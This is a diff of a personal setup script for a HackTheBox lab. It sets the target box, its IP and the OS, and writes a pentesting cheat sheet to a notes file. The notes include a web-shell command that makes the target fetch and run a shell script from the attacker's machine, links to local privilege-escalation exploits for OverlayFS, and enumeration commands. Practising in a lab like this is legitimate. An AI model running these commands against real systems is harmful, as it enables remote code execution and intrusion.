@@ -3,14 +3,14 @@
 # set box name, IP and ostype
 #for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done
 
-BOXNAME=Hospital
+BOXNAME=Armageddon2r
 LAST=
-OS=win
+OS=lin
 USER=bob
 
-export IP=	#10.10.11.$LAST
+export IP=10.10.55.249 #10.10.11.$LAST
 export HOME=/home/$USER/hackthebox/$BOXNAME          #enter box Name
-export SELF=$(hostname -I | awk '{print $4}')
+export SELF=$(hostname -I | awk '{print $6}')
 
 #start obsidian in background and push errors/output to /dev/null will need to copy .config/obsidian to folder or something to make it load the working directory but will figure out later...
 #and uhh.. doesn't load the newest version.. for some reason will add to notes to get it going may be just copying the vaults to show the vaults the .config/obsidian/obsidian.json but will play with later.. 
@@ -75,6 +75,7 @@ echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/D
 echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
 echo "don\'t do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do: " >> $HOME/notes
 echo "curl http://$IP/cmd.php --data-urlencode \'cmd=curl http://$SELF/shell.sh|bash\'" >> $HOME/notes
+echo "svn export https://github.com/repo.git/trunk/<folder to download>"  >> "$HOME/notes
 # Try nikto
 echo "" >> $HOME/notes
 echo "# nikto" >> $HOME/notes
@@ -201,6 +202,11 @@ echo "# enter docker image" >> $HOME/notes
 echo "sudo docker run -it --rm --entrypoint bash hacktehbox/node-web-app" >> $HOME/notes
 echo "# enter docker container" >> $HOME/notes
 echo "sudo docker exec -it container bash" >> $HOME/notes
+# OverlayFS and GameOverlay
+echo "" >> $HOME/notes
+echo "# OverlayFS and GameOverlay" >> $HOME/notes
+echo "https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/" >> $HOME/notes
+echo "https://github.com/briskets/CVE-2021-3493" >> $HOME/notes
 
 # Build obsidian files for not keeping
 # Cover page
